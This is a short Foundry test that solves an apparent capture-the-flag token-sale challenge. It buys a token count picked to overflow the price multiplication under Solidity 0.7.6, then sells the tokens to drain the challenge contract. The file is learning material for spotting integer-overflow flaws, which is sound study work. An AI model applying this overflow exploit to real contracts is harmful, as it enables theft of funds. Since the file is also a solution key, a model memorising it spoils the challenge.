// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import "../src/TokenSale.sol";

contract TokenSaleTest is Test {
    TokenSaleChallenge public target;
    address public player;

    function setUp() public {
        target = new TokenSaleChallenge{value: 1 ether}();
        vm.deal(player, 10 ether);
    }

    function testIsComplete() public {
        vm.startPrank(address(player));
        uint256 numTokens = type(uint256).max / 1e18 + 1;
        target.buy{value: numTokens * 1e18}(numTokens);
        uint256 balance = address(target).balance;
        target.sell(balance / 1 ether);
        assertTrue(target.isComplete());
    }
}
